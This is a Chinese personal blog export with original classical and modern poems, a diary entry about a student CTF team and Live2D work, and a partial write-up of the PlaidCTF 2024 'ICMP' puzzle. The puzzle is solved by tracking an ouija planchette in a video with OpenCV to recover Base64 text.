<div class="tabs" id="tab-poem"><ul class="nav-tabs"><li class="tab active"><a class="#poem-1">2024</a></li><li class="tab"><a class="#poem-2">2023</a></li><li class="tab"><a class="#poem-3">2022</a></li><li class="tab"><a class="#poem-4">2021</a></li></ul><div class="tab-content"><div class="tab-pane active" id="poem-1"><h5 id="有感"><a href="#有感" class="headerlink" title="有感"></a>有感</h5><p><em>（写于十二月二十六日）</em></p>
<blockquote>
<p>执手花落山重楼，问天风月水江轻。<br>春江匆匆冬又去，无情正待有穷生。</p>
</blockquote>
<h5 id="我是我"><a href="#我是我" class="headerlink" title="我是我"></a>我是我</h5><p><em>（写于十一月二日）</em></p>
<blockquote>
<p>书里的我死了<br>现实的我活着<br>扑通 扑通<br>短暂的雀跃<br>腐坏的身体需要一场手术<br>切除溃烂与肿瘤</p>
<p>掏空我 填补我 重塑我<br>哪个我是我<br>乳房 泪腺 胸膛<br>停滞的心跳<br>帽子 外套 口罩<br>人群的武装<br>解读我 参透我 排布我<br>雨落下 我是我</p>
</blockquote>
<h5 id="坐等晨眠听空谷"><a href="#坐等晨眠听空谷" class="headerlink" title="坐等晨眠听空谷"></a>坐等晨眠听空谷</h5><p><em>（写于八月二十八日）</em></p>
<blockquote>
<p>我想我病入膏肓了<br>熟悉，自然<br>它一来，我便知道。</p>
<p>拟人，是人认识世界的天赋<br>朋友，我狠不下心赶走朋友<br>它陪我数太阳升起</p>
<p>拟人，是人生而为人的枷锁<br>此刻，朋友的脉搏里流着谁的血<br>难道是我的吗<br>意志，他不该听从我的意志<br>意志，她的意志就是我的意志<br>意志，它从没有过意志</p>
<p>今夜，我向谁求饶<br>今夜，它又来与我等日出</p>
</blockquote>
<h5 id="无题"><a href="#无题" class="headerlink" title="无题"></a>无题</h5><p><em>（写于七月二十八日）</em></p>
<blockquote>
<p>收割机轰轰作响<br>投身滚轮与刀片的怀抱<br>回归故里，万剐千刀<br>尘埃万颗粒粒乡<br>海鸥，海风，海浪<br>1900<br>远山，云山，晓山<br>1901<br>海席卷山<br>碎骨粉身</p>
</blockquote>
<h5 id="飞羽"><a href="#飞羽" class="headerlink" title="飞羽"></a>飞羽</h5><p><em>（写于七月十六日）</em></p>
<blockquote>
<p>请把枪炮、欢笑和玫瑰收起<br>请把飞羽放归山林<br>冰凉的河水，不息的尘埃<br>把我埋葬<br>请给我自由</p>
</blockquote>
<h5 id="今夜月升影重重"><a href="#今夜月升影重重" class="headerlink" title="今夜月升影重重"></a>今夜月升影重重</h5><p><em>（写于六月五日）</em></p>
<blockquote>
<p>今夜月升影重重，风飘树摇兴阑珊。<br>小山无言醉晚意，明朝梦醒两相忘。</p>
</blockquote>
<h5 id="五月十一日深夜记"><a href="#五月十一日深夜记" class="headerlink" title="五月十一日深夜记"></a>五月十一日深夜记</h5><blockquote>
<p>翻山过重嶂，步步惊梦。循声暗道，踏花零落木叠叠。</p>
<p>浮云比肩绕，魂系高阁。高阁空算，昔时海棠钗雪，灭。</p>
</blockquote>
<h5 id="无题-1"><a href="#无题-1" class="headerlink" title="无题"></a>无题</h5><p><em>（写于二月十六日）</em>  </p>
<blockquote>
<p>旧故曲调重唱，莫怪多情烦扰。可怜辩白寥寥，争先抢高。天朗气清春日早，只叹小屋地偏少见光。借我酒一杯，慢叙愁百千。心事墨池留，魂浪天涯乡。</p>
</blockquote></div><div class="tab-pane" id="poem-2"><p><em>这一年高考写得东西都不是很好。而且也没有日子hh</em></p>
<h5 id="桥头叹"><a href="#桥头叹" class="headerlink" title="桥头叹"></a>桥头叹</h5><blockquote>
<p>桥头流水望，奔流不复回，流汇交转。谁叹？旧河入海不足惜。</p>
<p>往者不可见，来者犹可追，我又何必。作罢，韬光月色亦生辉。</p>
</blockquote>
<h5 id="勇士与花"><a href="#勇士与花" class="headerlink" title="勇士与花"></a>勇士与花</h5><p><em>（好像当时没有写完，现在删改增补一下偷偷放回23年）</em></p>
<blockquote>
<p>穿越黑暗的勇者<br>没有迎来黎明的光的奖励<br>可能因为披荆斩棘是勇士的天职</p>
<p>把破碎的语句拼接<br>献给我的花<br>和我一样不见光明的<br>花。</p>
<p>或许下一次<br>我为我自己</p>
</blockquote></div><div class="tab-pane" id="poem-3"><h5 id="粗俗笑话三则"><a href="#粗俗笑话三则" class="headerlink" title="粗俗笑话三则"></a>粗俗笑话三则</h5><p><em>（写于四月二十日）</em></p>
<blockquote>
<p>（一）<br>他深深浅浅的叹了一口气<br>我正好闻到了屁味<br>我知道他不会用嘴巴放屁<br>缺少阳光的小芽不会长成高壮<br>我知道</p>
</blockquote>
<p><em>（写于四月二十一日）</em></p>
<blockquote>
<p>（二）<br>回到过去<br>扇自己两巴掌<br>却因为时间线的变动而无法<br>留下两颗药<br>回到未来</p>
</blockquote>
<p><em>（写于四月二十八日）</em></p>
<blockquote>
<p>（三）<br>码头上没有薯条了<br>咸鱼、馅饼、占便宜<br>小狐狸在找第二条尾巴<br>后退、转身、低头<br>鼻涕泡里的是泪水和梦</p>
</blockquote>
<h5 id="避风光"><a href="#避风光" class="headerlink" title="避风光"></a>避风光</h5><p><em>(写于四月十九日)</em></p>
<blockquote>
<p>观世人避影趋阳，蹭功名吾心懭悢。<br>淅淅小雨寄惆怅，连浇菊花低头觞。<br>昔日无处躲风光，如今何地得荣耀？<br>空卑心不敢争上，撇高幔几番清高。</p>
</blockquote>
<p><em>（一篇自己没那么满意也不像自己风格的律诗hh）</em></p>
<h5 id="余晖五分钟"><a href="#余晖五分钟" class="headerlink" title="余晖五分钟"></a>余晖五分钟</h5><p><em>(写于三月二十五日)</em></p>
<blockquote>
<p>金色的存钱猪，<br>可以帮我存住这<br>余晖五分钟吗？</p>
<p>春风里，<br>歌唱这暗黄色的寝灯<br>和说不尽的<br>围墙外的痴情</p>
<p>球场热血又燃起，<br>是汗水和争吵都可爱<br>是转身和前进都可敬</p>
<p>老广播又响起谁的歌<br>教室里欢笑打闹<br>写下我们的歌</p>
<p>余晖啊<br>请再慢一点吧</p>
<p>如果这是春天的最后一句话<br>我不希望把不舍吞进肚里</p>
</blockquote>
<h5 id="飞鸟没有吞下钥匙"><a href="#飞鸟没有吞下钥匙" class="headerlink" title="飞鸟没有吞下钥匙"></a>飞鸟没有吞下钥匙</h5><p><em>我是写过这么一首长诗，然而发表长诗，总是需要勇气的，故而我便只是把题目放上来提醒我有这么一篇</em><br><em>（原诗写于2021.10,删改几多，定稿于2022.3）</em></p>
<h5 id="太阳黑子"><a href="#太阳黑子" class="headerlink" title="太阳黑子"></a>太阳黑子</h5><p><em>（写于二月七日）</em></p>
<blockquote>
<p>(一)<br>不是没有光<br>是还不够亮<br>不是不发热<br>是还不够滚烫</p>
<p>(二)<br>明明也一样是太阳<br>炽热，光彩，无私<br>愚蠢的地球人<br>却看不到那灼热的，<br>四千摄氏度的光<br>只把这小小的斑点叫做<br>“太阳黑子”。</p>
<p>（三）<br>观周身之艳羡兮，<br>无畏而曝光芒。<br>察余身之尤恨兮，<br>仅恪守以为阳。<br>偶有不甘自怜兮，<br>惶惶与四方试比光。</p>
<p>（四）<br>太阳黑子，讨厌暗淡<br>太阳黑子，习惯暗淡<br>太阳黑子，生来暗淡<br>纵有磁场引力万千<br>也吸引不了 自己</p>
</blockquote>
<p><em>（此篇充分展示了一个没选地理的人对于自然的幻想hh）</em></p></div><div class="tab-pane" id="poem-4"><p>刚开始写诗词的时候，常和朋友们对着玩，<strong>加粗</strong>的部分代表是别人出的：）</p>
<h5 id="江城子·误入晓梦"><a href="#江城子·误入晓梦" class="headerlink" title="江城子·误入晓梦"></a>江城子·误入晓梦</h5><p><em>（写于十二月十四日）</em></p>
<blockquote>
<p>误入晓梦迷三道，行匆匆，色深深，亦幻亦真，荒唐言意诚，铃响作罢返人间，灯晃晃，笔凉凉。</p>
<p>愈行愈远踌著志，字字逃，步步停，顾盼旧梦，呓语书柔情，琴振弦外无人应，何处去，何处寻？</p>
</blockquote>
<h5 id="我主张"><a href="#我主张" class="headerlink" title="我主张"></a>我主张</h5><p><em>我有点抠门哈哈，这首长诗也不想放出来，可以少放一点</em><br><em>（写于十二月四日）</em></p>
<blockquote>
<p>让该死的铺陈、排比和意象<br>都见上帝去<br>我此刻直抒胸臆<br>写下我的主张</p>
</blockquote>
<h5 id="无题"><a href="#无题" class="headerlink" title="无题"></a>无题</h5><p><em>(写于十一月三十日)</em></p>
<blockquote>
<p>粉色的晚霞遮住落日<br>轻吟今日的幸事<br>余晖向地平线偷跑<br>留下抓不住的背影<br>带我走吧<br>把悬而未决的谜题抛弃<br>带我走吧<br>去聆听真诚欢快的赞歌<br>带我走吧<br>去哪都好<br>去地平线后就很好</p>
</blockquote>
<h5 id="纪念昨天"><a href="#纪念昨天" class="headerlink" title="纪念昨天"></a>纪念昨天</h5><p><em>（写于十一月二十五日）</em></p>
<blockquote>
<p>月亮爬上嘴角，<br>夜空中挂着昨日的迷茫<br>星星已入眠，<br>但我不能<br>华尔兹悠扬，在银河流淌<br>肆意姿洋<br>今晚我的梦，<br>能响起这首歌吗？</p>
<p>来回又反复<br>细小的痛苦织就折磨<br>彷徨又徘徊<br>清冽的晚风吹醒月光<br>枕下的白纸黑字终要踏上流浪的路<br>希望这是收留它的，<br>最后一晚。</p>
</blockquote>
<h5 id="金桔味的茶"><a href="#金桔味的茶" class="headerlink" title="金桔味的茶"></a>金桔味的茶</h5><p><em>（写于十一月十八日）</em></p>
<blockquote>
<p>我喝茶也醉了<br>即使明知是泡影虚幻<br>我也愿继续沉睡</p>
<p>忧伤是保护壳<br>把乌托邦笼罩<br>我只品出其中甘美<br>越反常，越疯狂<br>就越挑逗，越迷人，越性感</p>
<p>饮料续杯<br>金桔的味道在喉道漫延<br>我却寻不到迷离的美<br>想到过去、现在，和未来<br>是丢失的她和自己<br>是沉重的背包和且行且窄的路</p>
<p>金桔味的茶<br>一杯足矣</p>
</blockquote>
<h5 id="雁后归·惊梦"><a href="#雁后归·惊梦" class="headerlink" title="雁后归·惊梦"></a>雁后归·惊梦</h5><p><em>（写于六月）</em></p>
<blockquote>
<p>祈福容易还福难，又是一事无成。算天时地利人和，命浅薄不享分毫。</p>
<p>风四起，扬旧事，雨霖霖泪涟涟。惊涛浪翻变乾坤，得失难计惊梦归。</p>
</blockquote>
<h5 id="此感"><a href="#此感" class="headerlink" title="此感"></a>此感</h5><p><em>（写于五月七日，PY出）</em></p>
<blockquote>
<p><strong>应是良辰好景，疏帘里，密意天人寄。歌余尘拂扇，舞罢风掀衫。人散后，一钩淡云天如水。</strong></p>
<p>惜剩断井颓垣，碎石坳，寥情山水绕。重唱旧时曲，又念故人语。月当悬，雨簌竹鸣事如烟。</p>
</blockquote>
<h5 id="蝶恋花·偶感"><a href="#蝶恋花·偶感" class="headerlink" title="蝶恋花·偶感"></a>蝶恋花·偶感</h5><p><em>（写于四月三日，PY出）</em></p>
<blockquote>
<p><strong>帘外东风随燕到，春色东来，循我来时道。一霎围场生绿草，归迟却怨春来早。</strong></p>
<p>星点荧斑花柳扫，新碧接沓，行彼独枝穷。只恨自难成皦皦，吵吵春日夺彩貌。</p>
</blockquote>
<h5 id="赤心凉"><a href="#赤心凉" class="headerlink" title="赤心凉"></a>赤心凉</h5><p><em>（写于三月二十六日）</em></p>
<blockquote>
<p>白宣素笔肠心诉，先响锵锵。再响镗镗，一纸忠肠，顾后瞻前敲略详。</p>
<p>交杂纷乱铿然响，行也徬徬。言也惶惶，两败俱伤，浊酒难消把苦藏。</p>
</blockquote>
<p><em>很长时间里个人最喜欢的一首，或者说非常非常满意的一篇，很有个人特色，叠字，工整，押韵，拟声，同音替换，感觉我的大脑只能装的下这个hh</em></p>
<h5 id="菩萨蛮·春来"><a href="#菩萨蛮·春来" class="headerlink" title="菩萨蛮·春来"></a>菩萨蛮·春来</h5><p><em>（写于三月十三日，脂斋出）</em></p>
<blockquote>
<p><strong>如酥小雨出草色，</strong>桃花笑面潺溪刻，新叶兀攀罗，把那桃李说。</p>
<p><strong>冷风吹散这，寒意南山落，</strong>旧雪不知俗，仍依枝杈间。</p>
</blockquote>
<h5 id="鹊踏枝·行云春上"><a href="#鹊踏枝·行云春上" class="headerlink" title="鹊踏枝·行云春上"></a>鹊踏枝·行云春上</h5><p><em>（写于三月十二日，PY出）</em></p>
<blockquote>
<p><strong>几日行云何处去？忘却归来，</strong>更把新愁铸。春雨绵绵花媚妩，风吹草晃飘杨絮。</p>
<p><strong>泪眼倚楼频独语，</strong>望遍山水，羡煞鸳鸯舞，新日荣荣凭栏祝，“相依相伴双出入”。</p>
</blockquote>
<p><em>算是第一首词了，写得吃力，况且要对上“泪眼倚楼频独语”。这句“泪眼倚楼频独语”，直到现在也是大伙公认的绝赞上品，我也非常喜欢。</em></p></div></div></div>]]></content>
      <tags>
        <tag>白鸟</tag>
      </tags>
  </entry>
  <entry>
    <title>羽毛要飞升了</title>
    <url>/2024/07/20/%E7%BE%BD%E6%AF%9B%E8%A6%81%E9%A3%9E%E5%8D%87%E4%BA%86/</url>
    <content><![CDATA[<p><em>_φ</em>_(．．)</p>
<p>好久好久没有写记录了，或者说更新喵喵这个tag了。</p>
<p>毕竟这个tag记录的都是很个人的私事，哈哈。</p>
<p>现在我的确很困了，但我还不想睡，可能是有话未说。</p>
<p>最近生活又是有很大的更新？在一些关系上？在一些工作进展上？以及我感觉我的消化系统好像重启了。不得不说，从所有功能关闭到等他每个功能一个一个打开的过程真挺折磨人的，本来我的体重就意外到了这两年的历史新低，哈哈这下又要掉一点了。</p>
<p>有的时候看到新生进群真的是感慨时间真的好快啊哈哈。我都变成管理员学姐了，尤其对我这种同期最后一批进入vidar的人来说。<br>虽然有人是大二才进入的，不过等到他们出题被压力拷打的时候其实也当是怎么说呢，混了挺久的了？哈哈。所以还是应该按上下半年来看。</p>
<p>(╥﹏╥)<br>对于关系的变动尤为在意的在于就这样结束了？其实描述起来很浓墨重彩但是现实里很轻描淡写。就像这一整段关系一样。感觉会有不熟悉，但更多的是是为自己的果决和现实的干脆不可思议吧。</p>
<p>赶在没有电脑之前把vidar娘皮套的1.0.0推了。(*´∀&#96;)~♥<br>当时还想着旅游回来赶紧把小毛病修了哈哈，结果忙的真的是像陀螺一样。这个新皮套其实有很多问题，我尤其不满意进了面捕之后很多效果都不对了，但是就像大家想的一样，的确，能全部流程走下了就很厉害啦。现在面世的1.0.0也是在未发布的base版上完全重做来的。很明显感受到因为是兼职所以没有明确的工作流导致效率经常突然十分低下（应该是偶尔高效）。<br>ʅ（´◔౪◔）ʃ重做的时候因为稍微明晰了一点点工作流所以稍微快一点点（，然而物理什么的还是。。害细节真的很多喵，live2d。</p>
<p>在CV上可喜的算是我过去的经验还是很宝贵的，而且虽然认识很浅薄但是也没白学（，可悲的是我真的远程协作不了一点（，从各个角度来讲我现在还是不熟悉CLI实在是一件很不应该的事哈哈（不过也比当时好了一万倍了，可能我会对熟悉的要求比较高吧<br>而且做视觉以及美工熟悉点GUI怎么了（</p>
<p>暑实好麻烦( ˘･з･)</p>
<p>虽然旅游完有很多事要做我是知道的，但也没想到这么焦头烂额哈哈<br>和RT一起在做的比赛，草稿箱里欠着的largebin一篇，杂谈一篇，还有曾经的yolov8一些介绍，之前说要做的plaidctf复现，协会出题（期待1zs好兄弟），，，，，还有青协的事情哈哈，感觉刷两道pwn题或者再沉淀一下基础什么的都。。。。。我还是一直想重学一下自己学过的或者说，正在用的语言的？比如说python,不过这种事情很重要但是不紧急的话肯定永远被插队啦。</p>
<p>羡慕睡得香的人。<br>晚安(￣o￣) . z Z</p>
]]></content>
      <tags>
        <tag>喵喵</tag>
      </tags>
  </entry>
  <entry>
    <title>Plaidctf2024-ICMP | 只完成了1/15的复现</title>
    <url>/2024/08/20/Plaidctf2024-%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>ヽ( ^ω^ ゞ )</p>
<h2 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h2><p>Reporter. bluepichu<br>Preliminary Investigator. iamcorwin<br>Type. Unexplained Event<br>Description. (Inter-Corporeality Messaging Protocol) We left an ouija board out as a joke, but then it started moving and it stopped being a joke.<br>Hypotheses. …ghosts?<br>Attachments.<br><a class="link"   href="https://www.youtube.com/watch?v=FGRs-6mMFTU&themeRefresh=1" >The Happening <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>Reward. 250 points</p>
<h3 id="write-up"><a href="#write-up" class="headerlink" title="write up"></a>write up</h3><p>先看爆出来的结果（视频前1&#x2F;15）：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20240819223048.png"
                     
                ><br><em>（存在后期添加空格）</em><br>好的，现在我们已经知道这个闹鬼小视频要说啥了：<br><strong>它会给我们一个Base64编码。开始的字母为大写，选中<code>YES</code>代表按下<code>Caps Lock</code>键，选中<code>NO</code>代表<code>/</code>(slash),<code>good</code>的第一个<code>o</code>代表<code>+</code>,<code>bye</code>的<code>y</code>代替的是<code>=</code>。</strong></p>
<p>然后他就开始在这个取字板上漂移了两个小时了。</p>
<p>我们的目标是把它取到的字用脚本爆出来，正确率如上图，除了后期加了空格没有别的处理了。<br>虽然后期编码的部分很难去校对，但是前面语句传达信息的部分可以看到100%正确，每个单词都没有错字，漏字。</p>
<p>思路大致是先对原视频做一点预处理，然后追踪中间的取字板，同时记录下追踪框的中心点坐标（也可以是中心偏下的点），一连串的中心点坐标完全可以表达取字板的运动信息，和一张固定的坐标表比对就可以知道现在是运动还是静止，静止的话选中了什么字。</p>
<h4 id="Why-not-Deep-Learning"><a href="#Why-not-Deep-Learning" class="headerlink" title="Why not Deep Learning?"></a>Why not Deep Learning?</h4><p>因为我犟。</p>
<p>其实真没啥别的原因，只是直觉上感觉深度学习为这个炼一个丹比较耗费人力<br>首先数据准备就要标注很多，目标也不明确。是要直接目标检测到每一个具体的字母还是要做单纯的取字板追踪。<br>前者太多数据了，而且必须要把取字板也截到图像里，复杂的光线+不太优质的像素注定了这是一个要炼相对久的大丹；后者则太亏了，仅用深度学习做到这一步后续还是有很多的处理，大材小用。</p>
<p>总之，我觉得作为一个限时赛题不太想用这样的方式解决，我也不太乐意炼一颗不太能迁移使用的丹，所以完全都是依托opencv做的。</p>
<p>当然，也可能是我对这些任务不够熟悉，没有更好的解决思路。(☍﹏⁰)<br>或许真有符合要求够用的某个预训练模板可以简单快速的梭了。</p>
<p>在此博客之后的讨论中都不包含任何与深度学习有关的内容。</p>
<p>我把这次的脚本整理成了几个<del>并不实用的</del>小工具：</p>
<a class="button  center large" href='https://github.com/Z1naX5/mini_CVgadget' title='code'><i class='fa-solid fa-play-circle'></i> code</a>

<h4 id="Preprocessing"><a href="#Preprocessing" class="headerlink" title="Preprocessing"></a>Preprocessing</h4><p>先看一下这个原图<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20240901092425.png"
                      alt="20240901092425"
                ></p>
<ul>
<li>视频里面灯光是闪动的，显然对画面干扰太大了</li>
<li>两个小时的视频对于追踪仍然有挑战，依旧需要切片</li>
<li>视频里面的信息过暗了，人眼都看不清机器怎么识别（机器确实不能用人眼的要求去看，不过处理过后的数据会有显著提升）</li>
</ul>
<h5 id="ROI"><a href="#ROI" class="headerlink" title="ROI"></a>ROI</h5><p><em>这个处理在最后的解题版本里有可能是没有用的，不过我没有做对比实验，这里仅介绍一下做了这个处理以及为什么</em></p>
<p>ROI(region of interest),就是从原始图像中选择一个区域作为感兴趣区域，目的就是排除不感兴趣区域的干扰，同时仅对感兴趣的部分进行运算。既可以提高准确率，只对部分区域高精度运算也可以节省算力加快速度。</p>
<p>ROI的选取当然可以是不规则的，除了矩形也可以是一个圆形、一个多边形，或者是按照像素颜色选取，比如所有的黄色部分…<br>不过这道题当时的处理只是很简单的裁切掉四周的灯光，因为在一开始的算法逻辑是运动检测以及静止帧判断而不是追踪和记录坐标，闪动的灯光非常干扰运动的判断，而且存在也不提供什么价值就直接裁掉了。<br>有关<code>运动</code>与<code>追踪</code>的讨论在后文还会有几次提及。</p>
<h5 id="Split"><a href="#Split" class="headerlink" title="Split"></a>Split</h5><p><em>把视频切分成200份人也可以做这个题了，但是给机器只需要5份</em></p>
<p>总之我的技术还没办法做到稳稳的追踪这个视频里的取字板两个小时的，时间越长，准确度越低。所以需要把每个视频切分的小一点，这样压力就小一点。</p>
<p>虽然最后因为各种原因还是切成了等分的15份，不过其实个人觉得10份以内应当是可以完成任务的，5份的话有点挑战（。</p>
<p>当然，切分之后的衔接也需要人眼稍微检查一下，这也是同样是需要切分，切给机器更有优势的原因。</p>
<h5 id="Feature-extraction"><a href="#Feature-extraction" class="headerlink" title="Feature extraction"></a>Feature extraction</h5><p><em>仅以保证追踪效果对图像进行处理</em></p>
<p>大致对图像做了这些操作，和不做处理的原图的对比的确效果有显著提升</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">preProccessing</span>(<span class="params">image</span>):</span><br><span class="line">    <span class="comment"># 灰度与对比度、亮度调整</span></span><br><span class="line">    image = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)</span><br><span class="line">    image0 = cv2.convertScaleAbs(image, alpha=<span class="number">3.3</span>, beta=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开运算提取亮部轮廓</span></span><br><span class="line">    kernel = np.ones((<span class="number">1</span>, <span class="number">3</span>), np.uint8)</span><br><span class="line">    image1 = cv2.dilate(image0, kernel, iterations=<span class="number">9</span>)</span><br><span class="line">    image1 = cv2.morphologyEx(image1, cv2.MORPH_OPEN, kernel)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 自适应二值化</span></span><br><span class="line">    image2 = cv2.adaptiveThreshold(image1, <span class="number">255</span>, cv2.ADAPTIVE_THRESH_GAUSSIAN_C, cv2.THRESH_BINARY, <span class="number">99</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 融合图像</span></span><br><span class="line">    image3 = cv2.addWeighted(image2, <span class="number">0.25</span>, image1, <span class="number">0.75</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 膨胀再次放大亮部</span></span><br><span class="line">    kernel = np.ones((<span class="number">2</span>, <span class="number">1</span>), np.uint8)</span><br><span class="line">    image4 = cv2.dilate(image3, kernel, iterations=<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> image4</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20240907220139.png"
                      alt="20240907220139"
                ><br><em>预处理前后对比</em></p>
<p>这样预处理的思路是观察转化为灰度之后的视频发现取字板中间有了一个圆形亮环，在取字板移动大部分像素都模糊失去特征的时候这个白色圆环变化较小，所以就尽可能使这个白环更加明显。</p>
<p>开运算与膨胀使用了不同大小的卷积核，首先卷积核开的很小是为了精准的把白环放大，而不被四周较暗的颜色影响（尤其在一开始对于没有处理过的灰度图来说），然后在完成所有图像处理后在不向上膨胀运算使提取出的白色更加明显。</p>
<h4 id="Trace-Record"><a href="#Trace-Record" class="headerlink" title="Trace &amp; Record"></a>Trace &amp; Record</h4><h5 id="Trace"><a href="#Trace" class="headerlink" title="Trace"></a>Trace</h5><p>从代码来看就是按照模板调用了一个openCV的函数，不过我们也可以来稍微简单了解一下这个函数的背后实现。</p>
<p>openCV目前提供八种不同的目标追踪工具，以及一个多目标追踪。表面上各有优劣，实际上体验下来我觉得有一些已经快要被时代淘汰了（</p>
<p>在这个题目的案例中，我们使用了<code>CSRT</code>追踪器，在openCV里实际上是用C++实现的这篇文章——<a class="link"   href="https://arxiv.org/pdf/1611.08461" >CSR-DCF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>因为本人目前在计算机视觉还是马喽水平，所以只能根据自己理解简单讲讲，或许之后会好好精读一下这篇。简单来说，<code>CSRT</code>是在<code>DCF</code>框架的基础上同时考虑<code>空间可靠性</code>与<code>通道可靠性</code>。加上空间可靠性主要可以解决<code>DCF</code>的循环样本训练的滤波器在边缘可信度不高的问题，也能够更好的跟踪到非矩形的目标。通道可靠性则主要是更加灵活的分配特征通道的权重，让表现更好的特征通道在运算时占更多比重。</p>
<p>然而比较可惜的是，由于形态学上的膨胀腐蚀操作对于彩色图像表现效果不突出，以及这次我更希望强调白色圆环的突出，<code>CSR-DCF</code>在空间可靠度带来的增强可能并不显著，因为这项改进是依靠颜色直方图来实现的，<del>然而就以原图单调的色彩或许彩色图片也不会有更好的效果。</del> 尽管openCV是开源的，截至写博客的时，我还没有查看openCV的库<code>CSRT</code>相关源码对于特征提取一共使用了几种，这与加入通道可靠性带来的效果提升息息相关。</p>
<p>或许研究的再深入一些在连续追踪的结果上可以做到更久的时长。</p>
<h5 id="Record"><a href="#Record" class="headerlink" title="Record"></a>Record</h5><p>就是把追踪框的中心坐标点记录下来输出到txt中，没有什么别的需要注意的。</p>
<h4 id="Search-Output"><a href="#Search-Output" class="headerlink" title="Search &amp; Output"></a>Search &amp; Output</h4><h5 id="Search"><a href="#Search" class="headerlink" title="Search"></a>Search</h5><p>首先是寻找静止帧，思路是根据抓取到的坐标来判断，从当前帧开始数的第三帧，第五帧与第一帧的距离小于某个范围即认为是静止，然后跳过一定的帧数。在写博客的过程中，我发现其实这个思路也是一种目标追踪的思路，详见后文<code>更多追踪</code>。</p>
<p>再是寻找对应的字母，通过一个小工具把字母表的坐标记录下来，然后再算静止帧与表中字母位置的距离。为了提高一点容错，在遍历坐标的时候不是选择符合阈值的就停下（此时的准确性已经很高了），而是计算所有的距离选择最近的同时符合阈值的。</p>
<h5 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h5><p>其实这里应该多做一个工作就是比如在接收到类似‘YES’之类的结果之后，把之后的输出切换大小写这样的，但是如你所见我并没有作这一步还（（（，而是直接输出了。</p>
<p>然后我还把符合静止帧但是找不到坐标表中对应的情况做了一个输出，一方面是视频开始时取字板有一段时间相对静止或者移动缓慢的情况需要区分，另一方面这也方便了调试。</p>
<h4 id="All-DOWN？"><a href="#All-DOWN？" class="headerlink" title="All DOWN？"></a>All DOWN？</h4><p>从上面的结果来看，在它开始选取BASE64编码之前，语句能够正常无误的被选中，所以我们就假设这样的流程下来的结果在准确度上不会有问题，那么是否就能完成左右的工作吗？</p>
<p>显然我只完成了1&#x2F;15的原因是因为后面没爆出来。</p>
<p>问题出在在第2&#x2F;15的时候，取字板多次的选中了字母<code>A</code>，而字母<code>A</code>又恰好在边上，通过预处理的图像在这里会因为左侧太亮了而使追踪框里的内容与我们希望的圆环有较大改变<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20240907220443.png"
                      alt="20240907220443"
                ></p>
<p>目标追踪算法是包含一个有关update的内容使其有更好的学习和泛化能力，他总是以最近的追踪框里的内容来认为我们追踪的东西，所以之后就会出现一个很尴尬的问题那就是当取字板划过月亮的时候，机器很自然的认为月亮就是我们要追的东西，然后就一直stuck在这里。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20240907220547.png"
                      alt="20240907220547"
                ><br>我们的追踪失败了。</p>
<p>出现这样的问题不得不说的就是PlaidCTF的主办方真的很有意思能想出这样一个点子，并且使用实拍来完成它，使得这个任务变得富有挑战性和趣味性。<br>最简单的解决方案就是直接以此为分界重新切片，在技术上只需要找到对应的帧数就好，也不难实现。</p>
<p>不过或许还有一个可以尝试的思路就是不要使用裁切过的视频，因为这能够为边缘在形态学处理的时候提供更多的可能的暗部信息。<br>追踪与运动的区别还在于追踪的概念是对一个已经确定的目标，而运动则是在全局画面中发现移动的目标，而最后使用的追踪的流程并不与闪动的灯光相关，所以也不用担心算法反复选中<code>运动的灯光</code>。</p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>这个题过了这么久还在研究完全是以熟悉opencv库与计算机视觉技术的角度出发，在没有引入简单的预训练模型时，就从人工智能图像处理的角度看能够做到什么程度。效果我觉得还行，差强人意吧。</p>
<h4 id="இдஇ"><a href="#இдஇ" class="headerlink" title="இдஇ"></a>இдஇ</h4><p>看上去是那么的流畅，但是实际上踩了超级多坑</p>
<p>一开始的时候第一个思路是运动检测获取到取字板的bounding box，然后以此为ROI，作文字识别。<br>这样做的问题有以下几点：</p>
<ul>
<li>灯光闪动影响运动检测（裁切解决）</li>
<li>文字识别的准确度不够高，同时无法区分<code>GOOD BYE</code>中的<code>O</code>与<code>Y</code>与字母表中的<code>O</code>和<code>Y</code>的区别</li>
<li>运动检测对于这个清晰度不是很高，加上环境灯光变化带来的明暗变化，即使追上取字板，内部的文字有可能不够清晰，或者追不上</li>
<li>首先要把所有静止选中的帧提取出来，但是依靠比对前后帧来做的静止帧提取，会有一个字选中多次或者漏字的情况，准确率不够高的情况更难判断什么时候是连续选中同一个字母两次。</li>
</ul>
<p>下面是尝试的解决方法（与失败原因）：</p>
<ul>
<li>放弃文字识别，模板匹配的效果也不好，最后还是考虑建一个坐标表，拿来区分<code>GOOD BYE</code>中的<code>O</code>与<code>Y</code>与字母表中的<code>O</code>和<code>Y</code></li>
<li>更换运动检测的算法，从一开始的前后帧比较变为背景差值（可以缓解这个框四处乱跳不能跟上的问题，但是长宽比变动很大，但是仅靠中心点也得不到准确的坐标）</li>
<li>调整静止帧提取的参数（然而准确度做不到百分百对于后续的编码带来的效果就是毁灭的）</li>
</ul>
